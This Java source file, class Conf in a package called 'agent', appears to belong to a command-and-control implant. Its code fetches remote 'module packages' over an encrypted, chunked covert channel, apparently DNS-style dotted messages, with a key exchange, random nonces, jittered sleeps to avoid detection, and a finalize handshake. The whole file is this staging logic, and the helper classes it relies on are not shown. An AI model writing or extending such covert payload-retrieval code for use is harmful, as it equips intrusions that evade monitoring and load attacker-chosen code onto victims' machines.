package agent;

import java.lang.reflect.InvocationTargetException;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Hashtable;
import java.util.concurrent.TimeUnit;

import javax.naming.NamingException;

public class Conf {
	//configuration retrieval protocol

	public static ArrayList<String> broker(String data, String cookie, String nonce) throws NoSuchAlgorithmException, ClassNotFoundException, NoSuchMethodException, SecurityException, IllegalAccessException, IllegalArgumentException, InvocationTargetException {
		String messageID = Util.strand(4);
		Hashtable svrParams = Netw.send("Kex",messageID,data,nonce);
		ArrayList<String> made = new ArrayList<String>(); 
		made.add(make(data,messageID,cookie));
		return made;
	}
	
	public static void finalize(String bufferKey) throws ClassNotFoundException, NoSuchMethodException, SecurityException, IllegalAccessException, IllegalArgumentException, InvocationTargetException, NoSuchAlgorithmException, NamingException {
		String nonce = Util.strand(12);
		String data = "_PBC|"+bufferKey; 		
		ArrayList<String> made = broker(data, Crypt.bake(),nonce); 
		ArrayList nullified = Netw.onomancy(made);
	}
	
	public static Hashtable retrieve(Hashtable bufferDescriptor) throws NamingException, Exception {
		Double length = (Double) bufferDescriptor.get("bufferSize");
		int bufferSize = length.intValue();
		String[] packageBuffer = new String[bufferSize];
		
		while (true) {
			//get buffers based on buffer Descriptor
			String nonce = Util.strand(12);
			String data = "_PCR|"+bufferDescriptor.get("bufferKey").toString(); 
			ArrayList<String> made = broker(data,Crypt.bake(),nonce);
			Hashtable nextSegment = receive(Netw.onomancy(made),nonce);
			
			Double index = (Double) nextSegment.get("index");
			int segmentIndex = index.intValue();
			//int segmentIndex = Integer.parseInt(nextSegment.get("index").toString());
			
			if (segmentIndex == -1) {
				finalize(bufferDescriptor.get("bufferKey").toString());
				String joinedBuffer = String.join("", packageBuffer);
				return Util.tabify(joinedBuffer);
			} else {
				packageBuffer[segmentIndex] = nextSegment.get("data").toString();
			}
			int jitterActual = Util.numrand((int) Main.config.get("jitterMin"), (int) Main.config.get("jitterMax"));
			TimeUnit.MILLISECONDS.sleep(jitterActual);
		}
		
	}

	public static String parse(ArrayList<String> response, String nonce) throws Exception {
		String rebuilt = new String(Util.rebuild(response));
		//clean up the response
		String cleanRebuilt = Util.clean(rebuilt);
		//convert raw array to hashtable
		String decryptedResponse = new String(Crypt.decrypt(Base64.getDecoder().decode(cleanRebuilt), nonce.getBytes()));
		return decryptedResponse;
	}
	
	public static Hashtable receive(ArrayList<String> response, String nonce) throws Exception {
		String decryptedResponse = parse(response,nonce);
		Hashtable tabifiedResponse = Util.tabify(decryptedResponse);

		return tabifiedResponse;
	}
	
	
	public static String make(String data, String msgID, String cookie) {
		String compiled = "." + data + ".6." + msgID;
		return compiled;
	}
	
	public static Hashtable dispatch(String msgID, String data, String etc) throws Exception {
		String nonce = Util.strand(12);
		ArrayList<String> made = broker(data,etc,nonce);
		
		//return module package
		Hashtable tabifiedDescriptor = receive(Netw.onomancy(made),nonce);
		return retrieve(tabifiedDescriptor);
	}
}

